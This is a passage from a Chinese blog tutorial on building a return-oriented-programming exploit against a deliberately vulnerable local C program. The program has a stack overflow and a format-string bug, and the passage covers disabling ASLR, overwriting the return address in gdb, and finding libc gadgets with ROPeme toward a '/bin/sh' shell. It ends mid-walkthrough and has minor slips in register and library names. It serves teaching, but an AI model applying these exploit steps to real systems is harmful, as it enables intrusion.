distorm</a></p>\n"},{"title":"ROP exploit 编写","url":"http://huirong.github.io/2016/03/11/ROP-exploit/","content":"<p>学习的过程，不仅要知其然，还要知其所以然，继前文<a href=\"http://huirong.github.io/2015/06/12/use-ROPgadget-to-chain-gadgets/\">使用ROPgadget构建gadgets链，实现ROP攻击</a>，本文学习一步一步编写ROP exploit。<br><a id=\"more\"></a></p>\n<h1 id=\"Ⅰ、ROP-和-ROP-gadget\"><a href=\"#Ⅰ、ROP-和-ROP-gadget\" class=\"headerlink\" title=\"Ⅰ、ROP 和 ROP gadget\"></a>Ⅰ、ROP 和 ROP gadget</h1><h2 id=\"①-定义\"><a href=\"#①-定义\" class=\"headerlink\" title=\"① 定义\"></a>① 定义</h2><p>ROP就是拼接目标应用程序和它所关联的库函数中已有的短指令序列，组成payload，这些短指令序列就是 gadget。ROP能成功绕过 NX/DEP(栈不可执行)。</p>\n<p>ROP gadgets 是以 ret 指令结尾的连续的短指令序列。这些二进制指令序列实现一些诸如读写内存、算术逻辑运算、控制流程跳转、函数调用等操作。</p>\n<p>因此可重新组合 gadgets ，达到进行任意操作的目的。</p>\n<p>而为了使各个 gadgets “拼接”起来，需构造一个特殊返回栈。首先让指向构造的栈（stack）的指针跳到 gadget A中，执行其中的代码序列后ret回我们的 stack 中，然后下一步是跳到 gadget B，执行后就到 gadgets C…… 只要 stack 足够大，就能达到我们想要的效果。</p>\n<h2 id=\"②-如何寻找-gadgets？\"><a href=\"#②-如何寻找-gadgets？\" class=\"headerlink\" title=\"② 如何寻找 gadgets？\"></a>② 如何寻找 gadgets？</h2><p>寻找 gadgets 算法：</p>\n<ul>\n<li>搜索所有的 “ret” 指令</li>\n<li>向前遍历，判断 “ret” 的前几个字节是否为合法指令。保留能构成有效指令的最大字节数（20 bytes）</li>\n<li>记录目标应用程序和它关联的库函数中所有的合法指令序列</li>\n</ul>\n<p>目前有多种自动化搜索 gadgets 工具，不用自己编写程序，下文会介绍。</p>\n<h2 id=\"③-ROP-Gadgets-功能\"><a href=\"#③-ROP-Gadgets-功能\" class=\"headerlink\" title=\"③ ROP Gadgets 功能\"></a>③ ROP Gadgets 功能</h2><p><strong> （1）load 常数 到寄存器 </strong></p>\n<ul>\n<li>解释：将栈中存放的常数加载到指定寄存器</li>\n<li><p>示例 ：POP eax;ret;<br>  将栈中的值 pop 到 eax 中，并返回栈顶存放的地址。<br>  <img src=\"https://ww1.sinaimg.cn/large/005CA6ZCjw1f1swkqy8k3j30pw04s75o.jpg\" alt=\"\"></p>\n<p>  因此，当返回地址覆盖为 pop eax/ret 的地址，首先返回到此指令序列，将 0xdeadbeef 的值加载到 eax 中，然后 “ret” 返回到下一条 gadget。</p>\n</li>\n</ul>\n<p><strong> （2）从内存中加载数据（load from memory） </strong></p>\n<ul>\n<li>示例：mov ecx,[eax];ret</li>\n<li>将存在放eax中的地址指向的值，加载到 ecx 中。</li>\n</ul>\n<p><strong> （3）写入内存（storing into memory） </strong></p>\n<ul>\n<li>将寄存器中的值写入内存</li>\n<li>示例：mov [eax],ecx;ret;<br>  将 ecx 中的值写入存放在 eax 地址指向的内存区。</li>\n</ul>\n<p><strong> （4）算术运算 </strong></p>\n<ul>\n<li>包括 加、减、乘、异或 or、&amp;</li>\n<li>示例：add eax,0x0b;ret(eax中的值加11，在存入eax中)<br>  xor edx,edx;ret(edx清零)</li>\n</ul>\n<p><strong> （5）系统调用 </strong></p>\n<ul>\n<li>系统调用指令实现内核中断</li>\n<li>示例：<ul>\n<li>int 0x80;ret</li>\n<li>call gs:[0x10];ret</li>\n</ul>\n</li>\n</ul>\n<p><strong> （6）尽量避免使用的gadgets </strong></p>\n<ul>\n<li>不要使用以 leave 结尾的gadgets，会污染栈帧</li>\n<li>不要使用包含 pop ebp 的gadgets，同样也会污染栈帧</li>\n</ul>\n<h1 id=\"Ⅱ、ROP-exploit-的编写\"><a href=\"#Ⅱ、ROP-exploit-的编写\" class=\"headerlink\" title=\"Ⅱ、ROP exploit 的编写\"></a>Ⅱ、ROP exploit 的编写</h1><h2 id=\"①-初始化\"><a href=\"#①-初始化\" class=\"headerlink\" title=\"① 初始化\"></a>① 初始化</h2><p>有漏洞的程序如下：<br> <figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> *argv[])</span></span>&#123;</div><div class=\"line\">\t<span class=\"keyword\">char</span> buf[<span class=\"number\">256</span>];</div><div class=\"line\">\t<span class=\"built_in\">memcpy</span>(buf, argv[<span class=\"number\">1</span>],<span class=\"built_in\">strlen</span>(argv[<span class=\"number\">1</span>]));</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(buf);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>禁用ASLR，然后测试程序是否正常运行。</p>\n<figure class=\"highlight fortran\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\"># echo <span class=\"number\">0</span> &gt; /proc/sys/kernel/randomize_va_space</div><div class=\"line\"># gcc -mpreferred-stack-boundary=<span class=\"number\">2</span> so3.c -o rop2</div><div class=\"line\">so3.c: <span class=\"keyword\">In</span> <span class=\"function\"><span class=\"keyword\">function</span></span> ‘main’:</div><div class=\"line\">so3.c:<span class=\"number\">6</span>:<span class=\"number\">2</span>: warning: incompatible <span class=\"keyword\">implicit</span> declaration of built-<span class=\"keyword\">in</span> <span class=\"function\"><span class=\"keyword\">function</span></span> ‘memcpy’ *enabled by <span class=\"keyword\">default</span>+</div><div class=\"line\">so3.c:<span class=\"number\">6</span>:<span class=\"number\">22</span>: warning: incompatible <span class=\"keyword\">implicit</span> declaration of built-<span class=\"keyword\">in</span> <span class=\"function\"><span class=\"keyword\">function</span></span> ‘strlen’ *enabled by <span class=\"keyword\">default</span>+</div><div class=\"line\"># ./rop2 `python -c <span class=\"string\">'print \"A\"*260'</span>`</div><div class=\"line\">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF􀳦􀳦􀳦</div><div class=\"line\"># gdb -q rop2</div><div class=\"line\">Reading symbols from /root/Desktop/tuts/so/rop2...(no debugging symbols found)...done.</div><div class=\"line\">(gdb) r `python -c <span class=\"string\">'print \"A\"*260+\"B\"*4'</span>`</div><div class=\"line\">Starting <span class=\"function\"><span class=\"keyword\">program</span></span>: /root/Desktop/tuts/so/rop2 `python -c <span class=\"string\">'print \"A\"*260+\"B\"*4'</span>`</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">Program</span></span> received signal SIGSEGV, Segmentation fault.</div><div class=\"line\">x42424242 <span class=\"keyword\">in</span> ?? ()</div><div class=\"line\">(gdb)</div></pre></td></tr></table></figure>\n<p>如上面所示，成功覆盖了返回地址，返回地址离shellcode起始地址 264 bytes。</p>\n<h2 id=\"②-自动化工具-ROPeme\"><a href=\"#②-自动化工具-ROPeme\" class=\"headerlink\" title=\"② 自动化工具 ROPeme\"></a>② 自动化工具 ROPeme</h2><p>使用自动化搜索工具 ROPeme 查找 libc 库中的 gadgets，ROPeme <a href=\"https://github.com/packz/ropeme\" target=\"_blank\" rel=\"external\">下载链接</a></p>\n<p>首次使用遇到 ImportError：No module named distorm，请参考<a href=\"http://huirong.github.io/2016/03/11/quick-fix-on-ropeme-importError/\">快速修复 ropeme ImportError：No module named distorm</a><br> 接下来，开启查找寻找 gadgets 之旅。</p>\n<h2 id=\"③-查看二进制关联的-libc-库\"><a href=\"#③-查看二进制关联的-libc-库\" class=\"headerlink\" title=\"③ 查看二进制关联的 libc 库\"></a>③ 查看二进制关联的 libc 库</h2><p> 有两种方法可以查看库文件<br> <strong> 1、info files </strong><br> gdb 调试器中，在 main 函数起始处设置断点，然后运行程序，使用 “ info files” 命令查看二进制关联的库文件。</p>\n <figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\">(gdb) b *main</div><div class=\"line\">Breakpoint <span class=\"number\">1</span> <span class=\"keyword\">at</span> <span class=\"number\">0x804847c</span></div><div class=\"line\">(gdb) r aaaa</div><div class=\"line\">The program being debugged has been started already.</div><div class=\"line\">Start <span class=\"keyword\">it</span> <span class=\"keyword\">from</span> <span class=\"keyword\">the</span> <span class=\"keyword\">beginning</span>? (y <span class=\"keyword\">or</span> n) y</div><div class=\"line\">Starting program: /root/Desktop/tuts/so/rop2 aaaa</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">Breakpoint <span class=\"number\">1</span>, <span class=\"number\">0x0804847c</span> <span class=\"keyword\">in</span> main ()</div><div class=\"line\">(gdb) info files</div><div class=\"line\">Symbols <span class=\"keyword\">from</span> <span class=\"string\">\"/root/Desktop/tuts/so/rop2\"</span>.</div><div class=\"line\">Unix child process:</div><div class=\"line\">\tUsing <span class=\"keyword\">the</span> <span class=\"built_in\">running</span> image <span class=\"keyword\">of</span> child process <span class=\"number\">28344.</span></div><div class=\"line\">\tWhile <span class=\"built_in\">running</span> this, GDB <span class=\"keyword\">does</span> <span class=\"keyword\">not</span> access memory <span class=\"keyword\">from</span>...</div><div class=\"line\">Local exec <span class=\"built_in\">file</span>:</div><div class=\"line\">\t`/root/Desktop/tuts/so/rop2', <span class=\"built_in\">file</span> type elf32-i386.</div><div class=\"line\">\tEntry point: <span class=\"number\">0x8048390</span></div><div class=\"line\">\t<span class=\"number\">0x08048134</span> - <span class=\"number\">0x08048147</span> <span class=\"keyword\">is</span> .interp</div><div class=\"line\">\t<span class=\"comment\">---snipped</span></div><div class=\"line\">\t<span class=\"number\">0x08049704</span> - <span class=\"number\">0x08049708</span> <span class=\"keyword\">is</span> .bss</div><div class=\"line\">\t<span class=\"number\">0xb7fe2114</span> - <span class=\"number\">0xb7fe2138</span> <span class=\"keyword\">is</span> .note.gnu.build-<span class=\"built_in\">id</span> <span class=\"keyword\">in</span> /lib/ld-linux.so<span class=\"number\">.2</span></div><div class=\"line\">\t<span class=\"comment\">---snipped---</span></div><div class=\"line\">\t<span class=\"number\">0xb7fc29a0</span> - <span class=\"number\">0xb7fc5978</span> <span class=\"keyword\">is</span> .bss <span class=\"keyword\">in</span> /lib/i386-linux-gnu/i686/cmov/libc.so<span class=\"number\">.6</span></div></pre></td></tr></table></figure>\n<p>/lib/ld-linux.so.2 和 /lib/i386-linux-gnu/i686/cmov/libc.so.6  都是二进制文件 “rop2” 关联的库</p>\n<p><strong> 2、/proc/pid/maps </strong><br> 运行程序，查看其 pid ，然后查看 maps<br> <figure class=\"highlight crystal\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@<span class=\"symbol\">kali:</span>~<span class=\"regexp\">/Desktop/tuts</span><span class=\"regexp\">/so# ps -aux | grep rop2</span></div><div class=\"line\">warning: bad ps syntax, perhaps a bogus '-'?</div><div class=\"line\">See http:/<span class=\"regexp\">/gitorious.org/procps</span><span class=\"regexp\">/procps/blobs</span><span class=\"regexp\">/master/</span>Documentation/FAQ</div><div class=\"line\">root <span class=\"number\">28117</span> <span class=\"number\">0.0</span> <span class=\"number\">0.3</span> <span class=\"number\">13624</span> <span class=\"number\">7748</span> pts/<span class=\"number\">2</span> S+ <span class=\"number\">15</span>:<span class=\"number\">57</span> <span class=\"number\">0</span>:<span class=\"number\">00</span> gdb -q rop2</div><div class=\"line\">root <span class=\"number\">28119</span> <span class=\"number\">0.0</span> <span class=\"number\">0.0</span> <span class=\"number\">1704</span> <span class=\"number\">252</span> pts/<span class=\"number\">2</span> t <span class=\"number\">15</span>:<span class=\"number\">57</span> <span class=\"number\">0</span>:<span class=\"number\">00</span> /root/Desktop/tuts/so/rop2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</div><div class=\"line\">root <span class=\"number\">28341</span> <span class=\"number\">0.0</span> <span class=\"number\">0.3</span> <span class=\"number\">13548</span> <span class=\"number\">7552</span> pts/<span class=\"number\">6</span> S <span class=\"number\">16</span>:<span class=\"number\">24</span> <span class=\"number\">0</span>:<span class=\"number\">00</span> gdb -q rop2</div><div class=\"line\">root <span class=\"number\">28344</span> <span class=\"number\">0.0</span> <span class=\"number\">0.0</span> <span class=\"number\">1700</span> <span class=\"number\">244</span> pts/<span class=\"number\">6</span> t <span class=\"number\">16</span>:<span class=\"number\">24</span> <span class=\"number\">0</span>:<span class=\"number\">00</span> /root/Desktop/tuts/so/rop2 aaaa</div><div class=\"line\">root <span class=\"number\">28392</span> <span class=\"number\">0.0</span> <span class=\"number\">0.0</span> <span class=\"number\">3484</span> <span class=\"number\">768</span> pts/<span class=\"number\">6</span> S+ <span class=\"number\">16</span>:<span class=\"number\">27</span> <span class=\"number\">0</span>:<span class=\"number\">00</span> grep rop2</div><div class=\"line\">root@<span class=\"symbol\">kali:</span>~<span class=\"regexp\">/Desktop/tuts</span><span class=\"regexp\">/so# cat /proc</span><span class=\"regexp\">/28119/maps</span></div><div class=\"line\"><span class=\"number\">08048000</span>-<span class=\"number\">08049000</span> r-xp <span class=\"number\">00000000</span> <span class=\"number\">08</span>:<span class=\"number\">01</span> <span class=\"number\">548883</span> /root/Desktop/tuts/so/rop2 (deleted)</div><div class=\"line\">---snipped---</div><div class=\"line\">b7e63000-b7fbf000 r-xp <span class=\"number\">00000000</span> <span class=\"number\">08</span>:<span class=\"number\">01</span> <span class=\"number\">1311258</span> /<span class=\"class\"><span class=\"keyword\">lib</span>/<span class=\"title\">i386</span>-<span class=\"title\">linux</span>-<span class=\"title\">gnu</span>/<span class=\"title\">i686</span>/<span class=\"title\">cmov</span>/<span class=\"title\">libc</span>-2.13.<span class=\"title\">so</span></span></div><div class=\"line\">b7fbf000-b7fc0000 ---p <span class=\"number\">0015</span>c000 <span class=\"number\">08</span>:<span class=\"number\">01</span> <span class=\"number\">1311258</span> /<span class=\"class\"><span class=\"keyword\">lib</span>/<span class=\"title\">i386</span>-<span class=\"title\">linux</span>-<span class=\"title\">gnu</span>/<span class=\"title\">i686</span>/<span class=\"title\">cmov</span>/<span class=\"title\">libc</span>-2.13.<span class=\"title\">so</span></span></div><div class=\"line\">b7fc0000-b7fc2000 r--p <span class=\"number\">0015</span>c000 <span class=\"number\">08</span>:<span class=\"number\">01</span> <span class=\"number\">1311258</span> /<span class=\"class\"><span class=\"keyword\">lib</span>/<span class=\"title\">i386</span>-<span class=\"title\">linux</span>-<span class=\"title\">gnu</span>/<span class=\"title\">i686</span>/<span class=\"title\">cmov</span>/<span class=\"title\">libc</span>-2.13.<span class=\"title\">so</span></span></div><div class=\"line\">b7fc2000-b7fc3000 rw-p <span class=\"number\">0015e000</span> <span class=\"number\">08</span>:<span class=\"number\">01</span> <span class=\"number\">1311258</span> /<span class=\"class\"><span class=\"keyword\">lib</span>/<span class=\"title\">i386</span>-<span class=\"title\">linux</span>-<span class=\"title\">gnu</span>/<span class=\"title\">i686</span>/<span class=\"title\">cmov</span>/<span class=\"title\">libc</span>-2.13.<span class=\"title\">so</span></span></div><div class=\"line\">---snipped---</div><div class=\"line\">b7fff000-b8000000 rw-p <span class=\"number\">0001</span>c000 <span class=\"number\">08</span>:<span class=\"number\">01</span> <span class=\"number\">1311294</span> /<span class=\"class\"><span class=\"keyword\">lib</span>/<span class=\"title\">i386</span>-<span class=\"title\">linux</span>-<span class=\"title\">gnu</span>/<span class=\"title\">ld</span>-2.13.<span class=\"title\">so</span></span></div><div class=\"line\">bffdf000-c0000000 rw-p <span class=\"number\">00000000</span> <span class=\"number\">00</span>:<span class=\"number\">00</span> <span class=\"number\">0</span> [stack]</div><div class=\"line\">b7fff000-b8000000 rw-p <span class=\"number\">0001</span>c000 <span class=\"number\">08</span>:<span class=\"number\">01</span> <span class=\"number\">1311294</span> /<span class=\"class\"><span class=\"keyword\">lib</span>/<span class=\"title\">i386</span>-<span class=\"title\">linux</span>-<span class=\"title\">gnu</span>/<span class=\"title\">ld</span>-2.13.<span class=\"title\">so</span></span></div><div class=\"line\">bffdf000-c0000000 rw-p <span class=\"number\">00000000</span> <span class=\"number\">00</span>:<span class=\"number\">00</span> <span class=\"number\">0</span> [stack]</div><div class=\"line\">root@<span class=\"symbol\">kali:</span>~<span class=\"regexp\">/Desktop/tuts</span><span class=\"regexp\">/so# exit</span></div><div class=\"line\">(gdb)</div></pre></td></tr></table></figure></p>\n<p>推荐使用第二种方法，可以查看库的起始地址，后续计算 gadgets 的真实地址时要用到。</p>\n<h1 id=\"Ⅲ、ROPeme-简介\"><a href=\"#Ⅲ、ROPeme-简介\" class=\"headerlink\" title=\"Ⅲ、ROPeme 简介\"></a>Ⅲ、ROPeme 简介</h1><p>首先运行，ROPeme中的脚本“ropshell.py”,然后查看帮助目录<br><figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali:~/Desktop/tuts/<span class=\"keyword\">so</span>/ropeme# ./ropshell.py</div><div class=\"line\">Simple ROP interactive <span class=\"keyword\">shell</span>: [<span class=\"keyword\">generate</span>, load, <span class=\"keyword\">search</span>] gadgets</div><div class=\"line\">ROPeMe&gt; <span class=\"keyword\">help</span></div><div class=\"line\">Available commands: <span class=\"keyword\">type</span> <span class=\"keyword\">help</span> &lt;command&gt; <span class=\"keyword\">for</span> detail</div><div class=\"line\"><span class=\"keyword\">generate</span> <span class=\"keyword\">Generate</span> ROP gadgets <span class=\"keyword\">for</span> binary</div><div class=\"line\">\tload Load ROP gadgets from <span class=\"keyword\">file</span></div><div class=\"line\">\t<span class=\"keyword\">search</span> <span class=\"keyword\">Search</span> ROP gadgets</div><div class=\"line\">\t<span class=\"keyword\">shell</span> <span class=\"keyword\">Run</span> external <span class=\"keyword\">shell</span> commands</div><div class=\"line\">\t^<span class=\"keyword\">D</span> <span class=\"keyword\">Exit</span></div><div class=\"line\">ROPeMe&gt;</div></pre></td></tr></table></figure></p>\n<h2 id=\"①-指定搜索目录\"><a href=\"#①-指定搜索目录\" class=\"headerlink\" title=\"① 指定搜索目录\"></a>① 指定搜索目录</h2><p>使用 generate 函数从函数二进制文件或关联的库中查找 gadgets，我们搜索 /lib/i386-linux-gnu/i686/cmov/libc-2.13.so 4 库函数。</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">ROPeMe&gt; generate /lib/i386-linux-gnu/i686/cmov/libc-<span class=\"number\">2.13</span><span class=\"selector-class\">.so</span> <span class=\"number\">4</span></div><div class=\"line\">Generating gadgets <span class=\"keyword\">for</span> /lib/i386-linux-gnu/i686/cmov/libc-<span class=\"number\">2.13</span><span class=\"selector-class\">.so</span> with backward depth=<span class=\"number\">4</span></div><div class=\"line\">It may take few minutes depends on the depth and file size...</div><div class=\"line\">Processing <span class=\"selector-tag\">code</span> block <span class=\"number\">1</span>/<span class=\"number\">2</span></div><div class=\"line\">Processing <span class=\"selector-tag\">code</span> block <span class=\"number\">2</span>/<span class=\"number\">2</span></div><div class=\"line\">Generated <span class=\"number\">10915</span> gadgets</div><div class=\"line\">Dumping asm gadgets to file: libc-<span class=\"number\">2.13</span><span class=\"selector-class\">.so</span><span class=\"selector-class\">.ggt</span> ...</div><div class=\"line\"></div><div class=\"line\">OK</div><div class=\"line\"></div><div class=\"line\">ROPeMe&gt;</div></pre></td></tr></table></figure>\n<p>generate 命令中紧跟在 libc-2.13.so 后的 4 代表：搜索深度。<br>最后的 OK 表示 generate 成功执行。</p>\n<h2 id=\"②-查找-gadget\"><a href=\"#②-查找-gadget\" class=\"headerlink\" title=\"② 查找 gadget\"></a>② 查找 gadget</h2><p>使用 search 函数查找要使用的 gadgets。<br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">ROPeMe&gt; search <span class=\"keyword\">pop</span> ?</div><div class=\"line\">Searching for ROP gadget: <span class=\"keyword\">pop</span> ? with constraints: []</div><div class=\"line\">0x29d1cL: <span class=\"keyword\">pop</span> <span class=\"built_in\">ds</span> <span class=\"comment\">;;</span></div><div class=\"line\">0x29d2fL: <span class=\"keyword\">pop</span> <span class=\"built_in\">ds</span> <span class=\"comment\">;;</span></div><div class=\"line\">0x29fd6L: <span class=\"keyword\">pop</span> <span class=\"built_in\">ds</span> <span class=\"comment\">;;</span></div><div class=\"line\">---snipped---</div><div class=\"line\">0x387cL: <span class=\"keyword\">pop</span> <span class=\"built_in\">esp</span> <span class=\"comment\">;;</span></div><div class=\"line\">0x9dad0L: <span class=\"keyword\">pop</span> <span class=\"built_in\">esp</span> <span class=\"comment\">;;</span></div><div class=\"line\">--More-- (<span class=\"number\">24</span>/<span class=\"number\">28</span>)</div><div class=\"line\">0x10eab9L: <span class=\"keyword\">pop</span> <span class=\"built_in\">esp</span> <span class=\"comment\">;;</span></div><div class=\"line\">ROPeMe&gt;</div></pre></td></tr></table></figure></p>\n<p>search pop ? : 搜索所有以 ret 结束的、包含 pop 的 gadgets。<br>? 表示 pop 下一条指令为 ret。例如 复合指令 “pop ? mov ?” 表示搜索 “pop r32;mov;ret” 指令序列。</p>\n<figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">ROPeMe&gt; search <span class=\"keyword\">pop</span> <span class=\"built_in\">eax</span> %</div><div class=\"line\">Searching for ROP gadget: <span class=\"keyword\">pop</span> <span class=\"built_in\">eax</span> % with constraints: []</div><div class=\"line\">0x189a4L: <span class=\"keyword\">pop</span> <span class=\"built_in\">eax</span> <span class=\"comment\">; add [esi] eax ; add [ebx+0x5d5b08c4] al ;;</span></div><div class=\"line\">0x61c42L: <span class=\"keyword\">pop</span> <span class=\"built_in\">eax</span> <span class=\"comment\">; mov [ecx+0xb8] edx ; pop ebx ; pop ebp ;;</span></div><div class=\"line\">---snipped---</div><div class=\"line\">0xd8f31L: <span class=\"keyword\">pop</span> <span class=\"built_in\">eax</span> <span class=\"comment\">;;</span></div><div class=\"line\">0xd8f52L: <span class=\"keyword\">pop</span> <span class=\"built_in\">eax</span> <span class=\"comment\">;;</span></div><div class=\"line\">ROPeMe&gt;</div></pre></td></tr></table></figure>\n<p>search pop eax % : eax 指令了特定寄存器；% 表示pop eax 后的指令数任意，且 结束指令可以是 “ret/leave;ret/pop ebp;ret”</p>\n<h1 id=\"Ⅳ、exploitation\"><a href=\"#Ⅳ、exploitation\" class=\"headerlink\" title=\"Ⅳ、exploitation\"></a>Ⅳ、exploitation</h1><p>接下来就是 exploitation 的功能，并具体组织 exploitation 过程。<br>我打算运行 “execve(“/bin/sh”,0,0)”;</p>\n<h2 id=\"①-exploitation-组成\"><a href=\"#①-exploitation-组成\" class=\"headerlink\" title=\"① exploitation 组成\"></a>① exploitation 组成</h2><p>Linux 系统调用的参数一般存放在 ebx,ecx,edx,esi,edi 寄存器中。<br>因此参数分布存放情况</p>\n<ul>\n<li>ebx: string 的地址</li>\n<li>ecx: argp数组的指针</li>\n<li>edx: envp数组的指针</li>\n<li>eax: 系统调用号<br>execve()的系统调用号是 “11” 或 “0xb”</li>\n</ul>\n<p>在 “/usr/include/i386-linux-gnu/asm/unistd_32.h” 中查看系统调用号。unistd_32.h 是 x86 汇编系统调用头文件。</p>\n<figure class=\"highlight less\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">root<span class=\"variable\">@kali:</span>~/Desktop/tuts/so# cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep execve</div><div class=\"line\">#define __NR_execve <span class=\"number\">11</span></div><div class=\"line\">root<span class=\"variable\">@kali</span>:~/Desktop/tuts/so#</div></pre></td></tr></table></figure>\n<p>exploitation 组成</p>\n<ol>\n<li>eax 清零</li>\n<li>move argp 数组的指针到 ecx</li>\n<li>move envp 数组的指针到 ecx</li>\n<li>设置 ebx 为 “/bin/sh” 的起始地址</li>\n<li>move oxb into eax</li>\n<li>执行系统调用</li>\n</ol>\n<h2 id=\"②-查找对应的-ROP-gadgets，完成上述功能。\"><a href=\"#②-查找对应的-ROP-gadgets，完成上述功能。\" class=\"headerlink\" title=\"② 查找对应的 ROP gadgets，完成上述功能。\"></a>② 查找对应的 ROP gadgets，完成上述功能。</h2><p><strong>（1）查找 “xor eax,eax;ret”，eax 清零。</strong><br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">ROPeMe&gt; search <span class=\"keyword\">xor</span> <span class=\"built_in\">eax</span> <span class=\"built_in\">eax</span> ?</div><div class=\"line\">Searching for ROP gadget: <span class=\"keyword\">xor</span> <span class=\"built_in\">eax</span> <span class=\"built_in\">eax</span> ? with constraints: []</div><div class=\"line\">0x7f448L: <span class=\"keyword\">xor</span> <span class=\"built_in\">eax</span> <span class=\"built_in\">eax</span> <span class=\"comment\">; leave ;;</span></div><div class=\"line\">0x10b090L: <span class=\"keyword\">xor</span> <span class=\"built_in\">eax</span> <span class=\"built_in\">eax</span> <span class=\"comment\">; leave ;;</span></div><div class=\"line\">0x796bfL: <span class=\"keyword\">xor</span> <span class=\"built_in\">eax</span> <span class=\"built_in\">eax</span> <span class=\"comment\">; ret ;;</span></div><div class=\"line\">ROPeMe&gt;</div></pre></td></tr></table></figure></p>\n<p>选择 0x796bfL: xor eax eax ; ret ;;<br>但是 0x796bfL 是 gadget 在 “lib-2.13.c” 库中的偏移地址，需计算 gadget 的实际地址，即 库起始地址 + 偏移地址<br>“lib-2.13.c” 的起始地址<br><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">0x796bf</span>+ <span class=\"number\">0xb7e63000</span> = <span class=\"number\">0xB7EDC6BF</span></div></pre></td></tr></table></figure></p>\n<p>因此 xor eax,eax;ret 的实际地址为 “0xB7EDC6BF”</p>\n<p>现在需将 “/bin/bash” 字符串保存在内存中，然后将其内存地址保存在 ebx 中。</p>\n<p>选取内存地址，最好是放在 .data 段，查看二进制文件 .data 的起始地址。<br><figure 